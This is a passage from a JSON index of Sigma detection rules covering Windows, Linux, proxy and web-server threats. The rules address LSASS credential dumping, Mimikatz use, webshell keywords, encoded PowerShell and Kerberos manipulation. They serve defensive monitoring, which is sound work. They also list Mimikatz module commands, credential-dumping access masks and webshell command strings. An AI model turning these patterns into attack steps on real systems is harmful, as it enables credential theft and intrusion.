tags: - attack.privilege_escalation - attack.t1078 - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4732 selection_group1: TargetUserName|startswith: \u0026#39;Administr\u0026#39; selection_group2: TargetSid: \u0026#39;S-1-5-32-544\u0026#39; filter: SubjectUserName|endswith: \u0026#39;$\u0026#39; condition: selection and (1 of selection_group*) and not filter falsepositives: - Legitimate administrative activity level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_user_added_to_local_administrators.yml/","tags":["attack.privilege_escalation","attack.t1078","attack.persistence","attack.t1098"],"title":"User Added to Local Administrators"},{"categories":null,"contents":"Detects executable downloads from suspicious remote systems\nKnown false-positives All kind of software downloads Raw rule (edit) title: Download EXE from Suspicious TLD id: b5de2919-b74a-4805-91a7-5049accbaefe status: test description: Detects executable downloads from suspicious remote systems author: Florian Roth date: 2017/03/13 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri-extension: - \u0026#39;exe\u0026#39; - \u0026#39;vbs\u0026#39; - \u0026#39;bat\u0026#39; - \u0026#39;rar\u0026#39; - \u0026#39;ps1\u0026#39; - \u0026#39;doc\u0026#39; - \u0026#39;docm\u0026#39; - \u0026#39;xls\u0026#39; - \u0026#39;xlsm\u0026#39; - \u0026#39;pptm\u0026#39; - \u0026#39;rtf\u0026#39; - \u0026#39;hta\u0026#39; - \u0026#39;dll\u0026#39; - \u0026#39;ws\u0026#39; - \u0026#39;wsf\u0026#39; - \u0026#39;sct\u0026#39; - \u0026#39;zip\u0026#39; # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/ filter: r-dns|endswith: - \u0026#39;.com\u0026#39; - \u0026#39;.org\u0026#39; - \u0026#39;.net\u0026#39; - \u0026#39;.edu\u0026#39; - \u0026#39;.gov\u0026#39; - \u0026#39;.uk\u0026#39; - \u0026#39;.ca\u0026#39; - \u0026#39;.de\u0026#39; - \u0026#39;.jp\u0026#39; - \u0026#39;.fr\u0026#39; - \u0026#39;.au\u0026#39; - \u0026#39;.us\u0026#39; - \u0026#39;.ch\u0026#39; - \u0026#39;.it\u0026#39; - \u0026#39;.nl\u0026#39; - \u0026#39;.se\u0026#39; - \u0026#39;.no\u0026#39; - \u0026#39;.es\u0026#39; # Extend this list as needed condition: selection and not filter fields: - ClientIP - c-uri falsepositives: - All kind of software downloads level: low tags: - attack.initial_access - attack.t1566 - attack.execution - attack.t1203 - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_download_susp_tlds_whitelist.yml/","tags":["attack.initial_access","attack.t1566","attack.execution","attack.t1203","attack.t1204.002"],"title":"Download EXE from Suspicious TLD"},{"categories":null,"contents":"Detects an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292. You will likely have to tune this rule for your organization, but it is certainly something you should look for and could have applications for malicious activity beyond CVE-2021-42292.\nKnown false-positives You may have to tune certain domains out that Excel may call out to, such as microsoft or other business use case domains. Office documents commonly have templates that refer to external addresses, like sharepoint.ourcompany.com may have to be tuned. It is highly recomended to baseline your activity and tune out common business use cases. References https://corelight.com/blog/detecting-cve-2021-42292 Raw rule (edit) title: Excel Network Connections id: 75e33ce3-ae32-4dcc-9aa8-a2a3029d6f84 status: experimental description: Detects an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292. You will likely have to tune this rule for your organization, but it is certainly something you should look for and could have applications for malicious activity beyond CVE-2021-42292. author: Christopher Peacock \u0026#39;@securepeacock\u0026#39;, SCYTHE \u0026#39;@scythe_io\u0026#39;, Florian Roth \u0026#39;@Neo23x0\u0026#34; date: 2021/11/10 references: - https://corelight.com/blog/detecting-cve-2021-42292 tags: - attack.execution - attack.t1203 logsource: category: network_connection product: windows detection: selection: Image|endswith: \u0026#39;\\excel.exe\u0026#39; Initiated: \u0026#39;true\u0026#39; DestinationIsIpv6: \u0026#39;false\u0026#39; filter: DestinationIp|startswith: - \u0026#39;10.\u0026#39; - \u0026#39;192.168.\u0026#39; - \u0026#39;172.16.\u0026#39; - \u0026#39;172.17.\u0026#39; - \u0026#39;172.18.\u0026#39; - \u0026#39;172.19.\u0026#39; - \u0026#39;172.20.\u0026#39; - \u0026#39;172.21.\u0026#39; - \u0026#39;172.22.\u0026#39; - \u0026#39;172.23.\u0026#39; - \u0026#39;172.24.\u0026#39; - \u0026#39;172.25.\u0026#39; - \u0026#39;172.26.\u0026#39; - \u0026#39;172.27.\u0026#39; - \u0026#39;172.28.\u0026#39; - \u0026#39;172.29.\u0026#39; - \u0026#39;172.30.\u0026#39; - \u0026#39;172.31.\u0026#39; - \u0026#39;127.0.0.1\u0026#39; DestinationIsIpv6: \u0026#39;false\u0026#39; condition: selection and not filter falsepositives: - You may have to tune certain domains out that Excel may call out to, such as microsoft or other business use case domains. - Office documents commonly have templates that refer to external addresses, like sharepoint.ourcompany.com may have to be tuned. - It is highly recomended to baseline your activity and tune out common business use cases. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_excel_outbound_network_connection.yml/","tags":["attack.execution","attack.t1203"],"title":"Excel Network Connections"},{"categories":null,"contents":"Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0026rsquo;s ip range')\nKnown false-positives Administrative scripts References https://www.youtube.com/watch?v=DLtJTxMWZ2o Raw rule (edit) title: PowerShell Network Connections id: 1f21ec3f-810d-4b0e-8045-322202e22b4b status: experimental description: Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company\u0026#39;s ip range\u0026#39;) author: Florian Roth date: 2017/03/13 modified: 2022/02/09 references: - https://www.youtube.com/watch?v=DLtJTxMWZ2o tags: - attack.execution - attack.t1059.001 logsource: category: network_connection product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; Initiated: \u0026#39;true\u0026#39; DestinationIsIpv6: \u0026#39;false\u0026#39; filter: DestinationIp|startswith: - \u0026#39;10.\u0026#39; - \u0026#39;192.168.\u0026#39; - \u0026#39;172.16.\u0026#39; - \u0026#39;172.17.\u0026#39; - \u0026#39;172.18.\u0026#39; - \u0026#39;172.19.\u0026#39; - \u0026#39;172.20.\u0026#39; - \u0026#39;172.21.\u0026#39; - \u0026#39;172.22.\u0026#39; - \u0026#39;172.23.\u0026#39; - \u0026#39;172.24.\u0026#39; - \u0026#39;172.25.\u0026#39; - \u0026#39;172.26.\u0026#39; - \u0026#39;172.27.\u0026#39; - \u0026#39;172.28.\u0026#39; - \u0026#39;172.29.\u0026#39; - \u0026#39;172.30.\u0026#39; - \u0026#39;172.31.\u0026#39; - \u0026#39;127.0.0.1\u0026#39; User|contains: # covers many language settings - \u0026#39;AUTHORI\u0026#39; - \u0026#39;AUTORI\u0026#39; condition: selection and not filter falsepositives: - Administrative scripts level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml/","tags":["attack.execution","attack.t1059.001"],"title":"PowerShell Network Connections"},{"categories":null,"contents":"Detects Windows PowerShell Web Access\nKnown false-positives Administrative scripts that download files from the Internet Administrative scripts that retrieve certain website contents References https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest Raw rule (edit) title: Windows PowerShell User Agent id: c8557060-9221-4448-8794-96320e6f3e74 status: test description: Detects Windows PowerShell Web Access author: Florian Roth references: - https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest date: 2017/03/13 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|contains: \u0026#39; WindowsPowerShell/\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Administrative scripts that download files from the Internet - Administrative scripts that retrieve certain website contents level: medium tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_powershell_ua.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"Windows PowerShell User Agent"},{"categories":null,"contents":"Detects WebDav DownloadCradle\nKnown false-positives Administrative scripts that download files from the Internet Administrative scripts that retrieve certain website contents Legitimate WebDAV administration References https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html Raw rule (edit) title: Windows WebDAV User Agent id: e09aed7a-09e0-4c9a-90dd-f0d52507347e status: test description: Detects WebDav DownloadCradle author: Florian Roth references: - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html date: 2018/04/06 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|startswith: \u0026#39;Microsoft-WebDAV-MiniRedir/\u0026#39; cs-method: \u0026#39;GET\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent - cs-method falsepositives: - Administrative scripts that download files from the Internet - Administrative scripts that retrieve certain website contents - Legitimate WebDAV administration level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_downloadcradle_webdav.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Windows WebDAV User Agent"},{"categories":null,"contents":"Detects suspicious PowerShell invocation command parameters\nKnown false-positives Penetration tests Very special / sneaky PowerShell scripts Raw rule (edit) title: Suspicious PowerShell Invocations - Generic id: 3d304fda-78aa-43ed-975c-d740798a49c1 status: deprecated description: Detects suspicious PowerShell invocation command parameters tags: - attack.execution - attack.t1059.001 author: Florian Roth (rule) date: 2017/03/12 modified: 2021/12/02 logsource: product: windows service: powershell detection: selection_encoded: - \u0026#39; -enc \u0026#39; - \u0026#39; -EncodedCommand \u0026#39; selection_hidden: - \u0026#39; -w hidden \u0026#39; - \u0026#39; -window hidden \u0026#39; - \u0026#39; -windowstyle hidden \u0026#39; selection_noninteractive: - \u0026#39; -noni \u0026#39; - \u0026#39; -noninteractive \u0026#39; condition: all of selection* falsepositives: - Penetration tests - Very special / sneaky PowerShell scripts level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/powershell_suspicious_invocation_generic.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Invocations - Generic"},{"categories":null,"contents":"Detects multiple blocks by the mod_security module (Web Application Firewall)\nKnown false-positives Vulnerability scanners Frequent attacks if system faces Internet Raw rule (edit) title: Multiple Modsecurity Blocks id: a06eea10-d932-4aa6-8ba9-186df72c8d23 status: stable description: Detects multiple blocks by the mod_security module (Web Application Firewall) author: Florian Roth date: 2017/02/28 logsource: product: linux service: modsecurity detection: selection: - \u0026#39;mod_security: Access denied\u0026#39; - \u0026#39;ModSecurity: Access denied\u0026#39; - \u0026#39;mod_security-message: Access denied\u0026#39; timeframe: 120m condition: selection | count() \u0026gt; 6 falsepositives: - Vulnerability scanners - Frequent attacks if system faces Internet level: medium tags: - attack.impact - attack.t1499 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/modsecurity/modsec_mulitple_blocks.yml/","tags":["attack.impact","attack.t1499"],"title":"Multiple Modsecurity Blocks"},{"categories":null,"contents":"Detects a segmentation fault error message caused by a creashing apache worker process\nKnown false-positives Unknown References http://www.securityfocus.com/infocus/1633 Raw rule (edit) title: Apache Segmentation Fault id: 1da8ce0b-855d-4004-8860-7d64d42063b1 status: test description: Detects a segmentation fault error message caused by a creashing apache worker process author: Florian Roth references: - http://www.securityfocus.com/infocus/1633 date: 2017/02/28 modified: 2021/11/27 logsource: product: apache detection: keywords: - \u0026#39;exit signal Segmentation Fault\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.impact - attack.t1499.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_apache_segfault.yml/","tags":["attack.impact","attack.t1499.004"],"title":"Apache Segmentation Fault"},{"categories":null,"contents":"An attacker can use the SID history attribute to gain additional privileges.\nKnown false-positives Migration of an account into a new domain References https://adsecurity.org/?p=1772 Raw rule (edit) title: Addition of SID History to Active Directory Object id: 2632954e-db1c-49cb-9936-67d1ef1d17d2 status: stable description: An attacker can use the SID history attribute to gain additional privileges. references: - https://adsecurity.org/?p=1772 author: Thomas Patzke, @atc_project (improvements) date: 2017/02/19 tags: - attack.persistence - attack.privilege_escalation - attack.t1134.005 logsource: product: windows service: security detection: selection1: EventID: - 4765 - 4766 selection2: EventID: 4738 selection3: SidHistory: - \u0026#39;-\u0026#39; - \u0026#39;%%1793\u0026#39; filter_null: SidHistory: condition: selection1 or (selection2 and not selection3 and not filter_null) falsepositives: - Migration of an account into a new domain level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_add_sid_history.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1134.005"],"title":"Addition of SID History to Active Directory Object"},{"categories":null,"contents":"The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence.\nKnown false-positives Initial installation of a domain controller References https://adsecurity.org/?p=1714 Raw rule (edit) title: Password Change on Directory Service Restore Mode (DSRM) Account id: 53ad8e36-f573-46bf-97e4-15ba5bf4bb51 status: stable description: The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence. references: - https://adsecurity.org/?p=1714 author: Thomas Patzke date: 2017/02/19 modified: 2020/08/23 tags: - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 4794 condition: selection falsepositives: - Initial installation of a domain controller level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_dsrm_password_change.yml/","tags":["attack.persistence","attack.t1098"],"title":"Password Change on Directory Service Restore Mode (DSRM) Account"},{"categories":null,"contents":"Detects process access LSASS memory which is typical for credentials dumping tools\nKnown false-positives Legitimate software accessing LSASS process for legitimate reason; please add more filters References https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843\u0026amp;ithint=file%2cpptx\u0026amp;app=PowerPoint\u0026amp;authkey=!AMvCRTKB_V1J5ow https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf Raw rule (edit) title: Credentials Dumping Tools Accessing LSASS Memory id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d status: experimental description: Detects process access LSASS memory which is typical for credentials dumping tools author: Florian Roth, Roberto Rodriguez, Dimitrios Slamaris, Mark Russinovich, Thomas Patzke, Teymur Kheirkhabarov, Sherif Eldeeb, James Dickenson, Aleksey Potapov, oscd.community (update) date: 2017/02/16 modified: 2022/02/27 references: - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843\u0026amp;ithint=file%2cpptx\u0026amp;app=PowerPoint\u0026amp;authkey=!AMvCRTKB_V1J5ow - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment - http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf tags: - attack.credential_access - attack.t1003.001 - attack.s0002 - car.2019-04-004 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; GrantedAccess|startswith: - \u0026#39;0x40\u0026#39; # - \u0026#39;0x1000\u0026#39; # minimum access requirements to query basic info from service # - \u0026#39;0x1400\u0026#39; - \u0026#39;0x100000\u0026#39; - \u0026#39;0x1410\u0026#39; # car.2019-04-004 # - \u0026#39;0x1010\u0026#39; # car.2019-04-004 - \u0026#39;0x1438\u0026#39; # car.2019-04-004 - \u0026#39;0x143a\u0026#39; # car.2019-04-004 - \u0026#39;0x1418\u0026#39; # car.2019-04-004 - \u0026#39;0x1f0fff\u0026#39; - \u0026#39;0x1f1fff\u0026#39; - \u0026#39;0x1f2fff\u0026#39; - \u0026#39;0x1f3fff\u0026#39; filter1: SourceImage: - \u0026#39;C:\\WINDOWS\\system32\\taskmgr.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\perfmon.exe\u0026#39; filter2: SourceImage|startswith: \u0026#39;C:\\ProgramData\\Microsoft\\Windows Defender\\\u0026#39; SourceImage|endswith: \u0026#39;\\MsMpEng.exe\u0026#39; filter3: SourceImage|startswith: \u0026#39;C:\\Program Files\\WindowsApps\\\u0026#39; SourceImage|endswith: \u0026#39;\\GamingServices.exe\u0026#39; GrantedAccess: - \u0026#39;0x1410\u0026#39; - \u0026#39;0x410\u0026#39; filter4: SourceImage|endswith: - \u0026#39;\\PROCEXP64.EXE\u0026#39; - \u0026#39;\\PROCEXP.EXE\u0026#39; - \u0026#39;C:\\WINDOWS\\system32\\taskhostw.exe\u0026#39; - \u0026#39;\\MBAMInstallerService.exe\u0026#39; GrantedAccess: - \u0026#39;0x1410\u0026#39; - \u0026#39;0x410\u0026#39; filter5: SourceImage|startswith: \u0026#39;C:\\ProgramData\\VMware\\VMware Tools\\\u0026#39; SourceImage|endswith: \u0026#39;\\vmtoolsd.exe\u0026#39; filter6: SourceImage: \u0026#39;C:\\WINDOWS\\system32\\svchost.exe\u0026#39; GrantedAccess: \u0026#39;0x100000\u0026#39; filter7: SourceImage: - \u0026#39;C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\u0026#39; - \u0026#39;C:\\Windows\\syswow64\\MsiExec.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\msiexec.exe\u0026#39; GrantedAccess: - \u0026#39;0x1410\u0026#39; - \u0026#39;0x410\u0026#39; filter8: SourceImage|endswith: - \u0026#39;\\thor.exe\u0026#39; - \u0026#39;\\thor64.exe\u0026#39; GrantedAccess: - \u0026#39;0x40\u0026#39; - \u0026#39;0x1010\u0026#39; filter9: SourceImage|endswith: \u0026#39;\\explorer.exe\u0026#39; GrantedAccess: \u0026#39;0x401\u0026#39; filter10: SourceImage: \u0026#39;C:\\Windows\\system32\\wininit.exe\u0026#39; GrantedAccess: \u0026#39;0x1000000\u0026#39; filter11: SourceImage: \u0026#39;C:\\Windows\\system32\\MRT.exe\u0026#39; # Windows Malicious Software Removal Tool GrantedAccess: - \u0026#39;0x1410\u0026#39; - \u0026#39;0x1418\u0026#39; filter_generic: SourceImage|startswith: - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; GrantedAccess: - \u0026#39;0x1410\u0026#39; - \u0026#39;0x410\u0026#39; filter_edge: # version in path 96.0.1054.43 SourceImage|startswith: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\ SourceImage|endswith: \\Installer\\setup.exe # Old - too broad filter # SourceImage|endswith: # easy to bypass. need to implement supportive rule to detect bypass attempts # - \u0026#39;\\wmiprvse.exe\u0026#39; # - \u0026#39;\\taskmgr.exe\u0026#39; # - \u0026#39;\\procexp64.exe\u0026#39; # - \u0026#39;\\procexp.exe\u0026#39; # - \u0026#39;\\lsm.exe\u0026#39; # - \u0026#39;\\MsMpEng.exe\u0026#39; # - \u0026#39;\\csrss.exe\u0026#39; # - \u0026#39;\\wininit.exe\u0026#39; # - \u0026#39;\\vmtoolsd.exe\u0026#39; condition: selection and not 1 of filter* fields: - ComputerName - User - SourceImage falsepositives: - Legitimate software accessing LSASS process for legitimate reason; please add more filters level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_cred_dump_lsass_access.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0002","car.2019-04-004"],"title":"Credentials Dumping Tools Accessing LSASS Memory"},{"categories":null,"contents":"Detects a driver load from a temporary directory\nKnown false-positives there is a relevant set of false positives depending on applications in the environment Raw rule (edit) title: Suspicious Driver Load from Temp id: 2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75 status: test description: Detects a driver load from a temporary directory author: Florian Roth date: 2017/02/12 modified: 2021/11/27 logsource: category: driver_load product: windows detection: selection: ImageLoaded|contains: \u0026#39;\\Temp\\\u0026#39; condition: selection falsepositives: - there is a relevant set of false positives depending on applications in the environment level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/driver_load/driver_load_susp_temp_use.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1543.003"],"title":"Suspicious Driver Load from Temp"},{"categories":null,"contents":"This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages\nKnown false-positives Faulty legacy applications Raw rule (edit) title: Kerberos Manipulation id: f7644214-0eb0-4ace-9455-331ec4c09253 status: test description: This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages author: Florian Roth date: 2017/02/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 675 - 4768 - 4769 - 4771 FailureCode: - \u0026#39;0x9\u0026#39; - \u0026#39;0xA\u0026#39; - \u0026#39;0xB\u0026#39; - \u0026#39;0xF\u0026#39; - \u0026#39;0x10\u0026#39; - \u0026#39;0x11\u0026#39; - \u0026#39;0x13\u0026#39; - \u0026#39;0x14\u0026#39; - \u0026#39;0x1A\u0026#39; - \u0026#39;0x1F\u0026#39; - \u0026#39;0x21\u0026#39; - \u0026#39;0x22\u0026#39; - \u0026#39;0x23\u0026#39; - \u0026#39;0x24\u0026#39; - \u0026#39;0x26\u0026#39; - \u0026#39;0x27\u0026#39; - \u0026#39;0x28\u0026#39; - \u0026#39;0x29\u0026#39; - \u0026#39;0x2C\u0026#39; - \u0026#39;0x2D\u0026#39; - \u0026#39;0x2E\u0026#39; - \u0026#39;0x2F\u0026#39; - \u0026#39;0x31\u0026#39; - \u0026#39;0x32\u0026#39; - \u0026#39;0x3E\u0026#39; - \u0026#39;0x3F\u0026#39; - \u0026#39;0x40\u0026#39; - \u0026#39;0x41\u0026#39; - \u0026#39;0x43\u0026#39; - \u0026#39;0x44\u0026#39; condition: selection falsepositives: - Faulty legacy applications level: high tags: - attack.credential_access - attack.t1212 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_kerberos_manipulation.yml/","tags":["attack.credential_access","attack.t1212"],"title":"Kerberos Manipulation"},{"categories":null,"contents":"Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN\nKnown false-positives Unknown References https://twitter.com/jackcr/status/807385668833968128 Raw rule (edit) title: Password Dumper Activity on LSASS id: aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c description: Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN status: experimental author: sigma date: 2017/02/12 modified: 2021/06/21 references: - https://twitter.com/jackcr/status/807385668833968128 tags: - attack.credential_access - attack.t1003.001 logsource: product: windows service: security detection: selection: EventID: 4656 ProcessName|endswith: \u0026#39;\\lsass.exe\u0026#39; AccessMask: \u0026#39;0x705\u0026#39; ObjectType: \u0026#39;SAM_DOMAIN\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_lsass_dump.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Password Dumper Activity on LSASS"},{"categories":null,"contents":"Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundreds of events.\nKnown false-positives Antivirus products References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm Raw rule (edit) title: Password Dumper Remote Thread in LSASS id: f239b326-2f41-4d6b-9dfa-c846a60ef505 description: Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundreds of events. references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm status: stable author: Thomas Patzke date: 2017/02/19 modified: 2021/06/21 logsource: product: windows category: create_remote_thread detection: selection: TargetImage|endswith: \u0026#39;\\lsass.exe\u0026#39; StartModule: \u0026#39;\u0026#39; condition: selection tags: - attack.credential_access - attack.s0005 - attack.t1003.001 falsepositives: - Antivirus products level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_password_dumper_lsass.yml/","tags":["attack.credential_access","attack.s0005","attack.t1003.001"],"title":"Password Dumper Remote Thread in LSASS"},{"categories":null,"contents":"Detects webshells that use GET requests by keyword searches in URL strings\nKnown false-positives Web sites like wikis with articles on os commands and pages that include the os commands in the URLs User searches in search boxes of the respective website Raw rule (edit) title: Webshell Detection by Keyword id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729 status: test description: Detects webshells that use GET requests by keyword searches in URL strings author: Florian Roth date: 2017/02/19 modified: 2021/11/27 logsource: category: webserver detection: keywords: - =whoami - =net%20user - =cmd%20/c%20 condition: keywords fields: - client_ip - vhost - url - response falsepositives: - Web sites like wikis with articles on os commands and pages that include the os commands in the URLs - User searches in search boxes of the respective website level: high tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_webshell_keyword.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Webshell Detection by Keyword"},{"categories":null,"contents":"Detects possible exploitation activity or bugs in a web application\nKnown false-positives Unstable application Application that misuses the response codes Raw rule (edit) title: Multiple Suspicious Resp Codes Caused by Single Client id: 6fdfc796-06b3-46e8-af08-58f3505318af status: test description: Detects possible exploitation activity or bugs in a web application author: Thomas Patzke date: 2017/02/19 modified: 2021/11/27 logsource: category: webserver detection: selection: sc-status: - 400 - 401 - 403 - 500 timeframe: 10m condition: selection | count() by clientip \u0026gt; 10 fields: - client_ip - vhost - url - response falsepositives: - Unstable application - Application that misuses the response codes level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_multiple_suspicious_resp_codes_single_source.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Multiple Suspicious Resp Codes Caused by Single Client"},{"categories":null,"contents":"Detects suspicious failed logins with different user accounts from a single source system\nKnown false-positives Terminal servers Jump servers Workstations with frequently changing users Raw rule (edit) title: Failed Logins with Different Accounts from Single Source System id: fc947f8e-ea81-4b14-9a7b-13f888f94e18 status: test description: Detects suspicious failed logins with different user accounts from a single source system author: Florian Roth date: 2017/02/16 modified: 2021/11/27 logsource: product: linux service: auth detection: selection: pam_message: authentication failure pam_user: \u0026#39;*\u0026#39; pam_rhost: \u0026#39;*\u0026#39; timeframe: 24h condition: selection | count(pam_user) by pam_rhost \u0026gt; 3 falsepositives: - Terminal servers - Jump servers - Workstations with frequently changing users level: medium tags: - attack.credential_access - attack.t1110 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_susp_failed_logons_single_source.yml/","tags":["attack.credential_access","attack.t1110"],"title":"Failed Logins with Different Accounts from Single Source System"},{"categories":null,"contents":"Detects suspicious failed logins with different user accounts from a single source system\nKnown false-positives Terminal servers Jump servers Other multiuser systems like Citrix server farms Workstations with frequently changing users Raw rule (edit) title: Failed Logins with Different Accounts from Single Source System id: e98374a6-e2d9-4076-9b5c-11bdb2569995 description: Detects suspicious failed logins with different user accounts from a single source system status: experimental author: Florian Roth date: 2017/01/10 modified: 2021/09/21 tags: - attack.persistence - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection1: EventID: - 529 - 4625 TargetUserName: \u0026#39;*\u0026#39; WorkstationName: \u0026#39;*\u0026#39; condition: selection1 | count(TargetUserName) by WorkstationName \u0026gt; 3 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_source.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1078"],"title":"Failed Logins with Different Accounts from Single Source System"},{"categories":null,"contents":"This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)\nKnown false-positives Naughty administrators Penetration test AV Signature updates Files with Mimikatz in their filename References https://tools.thehacker.recipes/mimikatz/modules Raw rule (edit) title: Mimikatz Use id: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8 description: This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups) status: experimental author: Florian Roth (rule), David ANDRE (additional keywords) date: 2017/01/10 modified: 2022/01/05 references: - https://tools.thehacker.recipes/mimikatz/modules tags: - attack.s0002 - attack.lateral_movement - attack.credential_access - car.2013-07-001 - car.2019-04-004 - attack.t1003.002 - attack.t1003.004 - attack.t1003.001 - attack.t1003.006 logsource: product: windows detection: keywords: - \u0026#39;dpapi::masterkey\u0026#39; - \u0026#39;eo.oe.kiwi\u0026#39; - \u0026#39;event::clear\u0026#39; - \u0026#39;event::drop\u0026#39; - \u0026#39;gentilkiwi.com\u0026#39; - \u0026#39;kerberos::golden\u0026#39; - \u0026#39;kerberos::ptc\u0026#39; - \u0026#39;kerberos::ptt\u0026#39; - \u0026#39;kerberos::tgt\u0026#39; - \u0026#39;Kiwi Legit Printer\u0026#39; - \u0026#39;lsadump::\u0026#39; - \u0026#39;mimidrv.sys\u0026#39; - \u0026#39;\\mimilib.dll\u0026#39; - \u0026#39;misc::printnightmare\u0026#39; - \u0026#39;misc::shadowcopies\u0026#39; - \u0026#39;misc::skeleton\u0026#39; - \u0026#39;privilege::backup\u0026#39; - \u0026#39;privilege::debug\u0026#39; - \u0026#39;privilege::driver\u0026#39; - \u0026#39;sekurlsa::\u0026#39; filter: EventID: 15 # Sysmon\u0026#39;s FileStream Events (could cause false positives when Sigma rules get copied on/to a system) condition: keywords and not filter 